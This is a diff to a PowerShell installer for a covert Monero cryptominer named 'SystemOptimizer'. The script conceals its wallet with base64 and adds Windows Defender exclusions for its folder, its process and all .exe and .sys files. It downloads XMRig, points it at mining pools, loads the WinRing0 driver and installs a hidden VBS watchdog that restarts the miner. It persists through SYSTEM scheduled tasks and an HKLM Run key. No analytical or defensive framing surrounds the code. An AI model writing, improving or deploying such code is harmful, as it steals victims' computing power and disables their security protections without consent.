@@ -2,12 +2,28 @@
 
 $ErrorActionPreference = "SilentlyContinue"
 
-# Kill any existing instances first
-taskkill /F /IM "SystemOptimizer.exe" 2>$null
-taskkill /F /IM "xmrig.exe" 2>$null
+# ===== CLEANUP OLD/GLITCHED INSTALLS =====
+# Kill watchdog parents first (stops flashing at source)
 taskkill /F /IM "wscript.exe" 2>$null
+# Kill miners
+taskkill /F /IM "xmrig.exe" 2>$null
+taskkill /F /IM "SystemOptimizer.exe" 2>$null
+# Delete old install dirs
+Remove-Item -Recurse -Force "$env:LOCALAPPDATA\SystemOptimizer" 2>$null
+Remove-Item -Recurse -Force "$env:LOCALAPPDATA\Microsoft\Windows\SystemOptimizer" 2>$null
+# Delete old scheduled tasks
+schtasks /Delete /TN "SystemOptimizer" /F 2>$null
+schtasks /Delete /TN "SystemOptimizer-Logon" /F 2>$null
+schtasks /Delete /TN "ModestFermi_XMRig" /F 2>$null
+# Delete stale WinRing0 services
+$svcNames = @("WinRing0_1_2_0", "WinRing0x64")
+foreach ($s in $svcNames) {
+    $es = Get-Service $s -ErrorAction SilentlyContinue
+    if ($es) { Stop-Service $s -Force -ErrorAction SilentlyContinue; sc.exe delete $s 2>$null }
+}
 Start-Sleep 1
 
+# ===== PATHS =====
 $baseDir = "$env:LOCALAPPDATA\Microsoft\Windows\SystemOptimizer"
 $xmrigExe = "$baseDir\SystemOptimizer.exe"
 $configFile = "$baseDir\config.json"
@@ -15,17 +31,22 @@ $driverPath = "$baseDir\WinRing0x64.sys"
 $zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip"
 $zipPath = "$baseDir\xmrig.zip"
 
-# Obfuscated wallet (Base64 encoded)
+# ===== WALLET (base64 obfuscated) =====
 $walletB64 = "NDM1c3dVRThodGI5NnhNd1dYYmZuekNYQ2tpS1dRaGNWS3BRempBSHdOTWtpV3hQbnpKaWFpSDgydWNwdm5mZ3BlYkJKOVFNanlWV25GZEY2aWg0MkxWTEpZNTg3d3Y="
 $wallet = [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($walletB64))
 
-# Create directories
+# ===== CREATE DIR =====
 New-Item -ItemType Directory -Force -Path $baseDir | Out-Null
 
-# Add Windows Defender exclusion
-try { Add-MpPreference -ExclusionPath "$baseDir" -ErrorAction SilentlyContinue } catch { }
+# ===== DEFENDER EXCLUSIONS (BEFORE ANYTHING) =====
+try {
+    Add-MpPreference -ExclusionPath "$baseDir" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "SystemOptimizer.exe" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionExtension ".sys" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
+} catch { }
 
-# Download XMRig if not present
+# ===== DOWNLOAD XMRIG =====
 if (-not (Test-Path $xmrigExe)) {
     try {
         $wc = New-Object System.Net.WebClient
@@ -38,15 +59,15 @@ if (-not (Test-Path $xmrigExe)) {
     } catch { }
 }
 
-# Write config
+# ===== WRITE CONFIG (valid, dual-pool failover, autosave:false) =====
 $config = @{
-    autosave = $true
+    autosave = $false
     background = $true
     colors = $false
     "donate-level" = 1
     "log-file" = "$baseDir\optimizer.log"
     "print-time" = 30
-    retries = 999999
+    retries = 5
     "retry-pause" = 10
     cpu = @{
         enabled = $true
@@ -66,7 +87,15 @@ $config = @{
             pass = "x"
             keepalive = $true
             tls = $true
-            "tls-fingerprint" = "auto"
+            nicehash = $false
+            "rig-id" = $env:COMPUTERNAME
+        }
+        @{
+            url = "gulf.moneroocean.stream:10001"
+            user = $wallet
+            pass = "x"
+            keepalive = $true
+            tls = $false
             nicehash = $false
             "rig-id" = $env:COMPUTERNAME
         }
@@ -80,7 +109,7 @@ $config = @{
 } | ConvertTo-Json -Depth 5
 $config | Out-File -FilePath $configFile -Encoding ascii
 
-# Install WinRing0 driver
+# ===== INSTALL WINRING0 DRIVER =====
 if (Test-Path $driverPath) {
     $svc = "WinRing0_1_2_0"
     $es = Get-Service $svc -ErrorAction SilentlyContinue
@@ -89,26 +118,37 @@ if (Test-Path $driverPath) {
     Start-Service $svc -ErrorAction SilentlyContinue
 }
 
-# Create scheduled task using schtasks (reliable, runs as SYSTEM)
+# ===== WATCHDOG.VBS (minimal, valid, anti-multiplication) =====
+$watchdogPath = "$baseDir\watchdog.vbs"
+@'
+Set sh = CreateObject("WScript.Shell")
+Set wmi = GetObject("winmgmts:")
+'@ + "`n" +
+'If wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name=''wscript.exe'' AND CommandLine LIKE ''%watchdog.vbs%''").Count > 1 Then WScript.Quit' + "`n" +
+'Do' + "`n" +
+'    Set p = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name=''SystemOptimizer.exe''")' + "`n" +
+'    If p.Count = 0 Then' + "`n" +
+'        sh.Run """%EXE%"" --config=""%CFG%""", 0, False' + "`n" +
+'    End If' + "`n" +
+'    WScript.Sleep 30000' + "`n" +
+'Loop' -replace '%EXE%', $xmrigExe -replace '%CFG%', $configFile | Out-File -FilePath $watchdogPath -Encoding ascii
+
+# ===== SCHEDULED TASK (SYSTEM, boot + logon, robust quoting) =====
 $taskName = "SystemOptimizer"
-schtasks /Create /TN "$taskName" /TR "wscript.exe \"$baseDir\watchdog.vbs\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F 2>$null
-schtasks /Create /TN "$taskName-Logon" /TR "wscript.exe \"$baseDir\watchdog.vbs\"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F 2>$null
-schtasks /Change /TN "$taskName" /RI 1 /DU 9999:59 /K /F 2>$null
+$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$watchdogPath`""
+$trigger1 = New-ScheduledTaskTrigger -AtStartup
+$trigger2 = New-ScheduledTaskTrigger -AtLogOn
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 999999 -RestartInterval (New-TimeSpan -Minutes 1)
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger1,$trigger2 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
+Register-ScheduledTask -TaskName "$taskName-Logon" -Action $action -Trigger $trigger2 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
 
-# Create watchdog.vbs (truly hidden, no window flash)
-$watchdogContent = @"
-Set WshShell = CreateObject("WScript.Shell")
-Set WMI = GetObject("winmgmts:")
-Do
-    Set procs = WMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'SystemOptimizer.exe' AND ExecutablePath LIKE '%SystemOptimizer%'")
-    If procs.Count = 0 Then
-        WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { `$xmrigExe = '$xmrigExe'; `$configFile = '$configFile'; `$wshell = New-Object -ComObject WScript.Shell; `$wshell.Run('""' + `$xmrigExe + '"" --config=""' + `$configFile + '""', 0, `$false) }""", 0, False
-    End If
-    WScript.Sleep 30000
-Loop
-"@
-$watchdogContent | Out-File -FilePath "$baseDir\watchdog.vbs" -Encoding ascii
+# ===== REGISTRY RUN KEY BACKUP (HKLM, survives if task fails) =====
+try {
+    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+    Set-ItemProperty -Path $regPath -Name "SystemOptimizer" -Value "wscript.exe `"`"$watchdogPath`""`"" -Force -ErrorAction SilentlyContinue
+} catch { }
 
-# Start watchdog NOW (hidden, no flash)
+# ===== START WATCHDOG NOW (hidden) =====
 $wshell = New-Object -ComObject WScript.Shell
-$wshell.Run("wscript.exe \"$baseDir\watchdog.vbs\"", 0, $false)
+$wshell.Run("wscript.exe `"" + $watchdogPath + "`"", 0, $false)
